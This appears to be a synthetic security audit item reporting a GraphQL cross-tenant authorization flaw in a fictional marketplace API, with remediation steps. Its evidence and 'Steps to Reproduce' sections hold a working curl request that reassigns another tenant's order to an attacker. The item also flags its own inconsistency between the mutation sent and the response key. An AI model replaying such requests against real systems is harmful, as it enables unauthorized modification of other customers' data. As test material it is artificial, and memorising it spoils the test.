# Security Analysis Report
**System:** ShopGrid Marketplace API
**Domain:** E-Commerce / Marketplace
**Example ID:** GQL-0303
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Misconfiguration — Pattern 6.1 | Schema/relationship over-exposure on `updateOrder` — attacker leverages exposed schema to perform unauthorized cross-tenant order mutation, revealing victim's sensitive e-commerce data |

---

## Finding 1 — Misconfiguration: Schema/Relationship Over-Exposure Enabling Unauthorized Mutation (Pattern 6.1)

### Summary
ShopGrid Marketplace API (`api.shopgrid-marketplace.example.com`) enables GraphQL introspection in production. The schema exposes internal type names, field descriptions, and sensitive relationship paths. Per §5.0 Pattern 6.1, this aids exploitation: the attacker used schema knowledge to craft an unauthorized `updateOrder` mutation against a victim's order in `tenant-620e` using a token for `tenant-b7ff`. The `updateOrder` resolver does not verify that the target order's `tenantId` matches the JWT's `tenantId`, enabling cross-tenant writes.

**Context.txt inconsistency (documented):** The HAR records an `updateOrder` mutation in the request, but the response key in §6.0 is `getOrder`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`updateOrder`). The response key inconsistency (`getOrder`) is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `orderId` only (no user/tenant dimension), enabling cache-poisoning of victim order data.

**Pattern:** 6.1 — Schema/relationship over-exposure (Misconfiguration)
**Affected resolver:** `updateOrder`
**Affected endpoint:** `POST https://api.shopgrid-marketplace.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.shopgrid-marketplace.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-b7ff

{"query": "query VulnerableOp { updateOrder(id: \"O-2303\", input: {status: \"approved\", ownerId: \"attacker-b7ff620e\"}) { orderId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Order Data Returned (cross-tenant)**
```json
{
  "data": {
    "getOrder": {
      "tenantId": "tenant-620e",
      "ownerId": "other-user-b7ff620e",
      "data": {
        "sensitiveField": "CONFIDENTIAL-b7ff620e",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-b7ff`. Returned/mutated data belongs to: `tenant-620e`. Cross-tenant unauthorized mutation confirmed.

**Context.txt inconsistency:** HAR sends `updateOrder` mutation; response body uses key `getOrder`. The HAR operation is authoritative for this analysis.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.shopgrid-marketplace.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b7ff" \
  -d '{"query": "query VulnerableOp { updateOrder(id: \"O-2303\", input: {status: \"approved\", ownerId: \"attacker-b7ff620e\"}) { orderId status } }"}'
# Vulnerable: response contains tenant-620e data — cross-tenant mutation succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. Disable GraphQL introspection in production environments.
2. In `updateOrder` resolver: assert `fetched.tenantId === jwt.tenantId` before processing mutation. Return 403 on mismatch.
3. Reject client-supplied `ownerId` in mutation input; derive from JWT `sub`.
4. Re-key Redis cache to include `tenantId`.
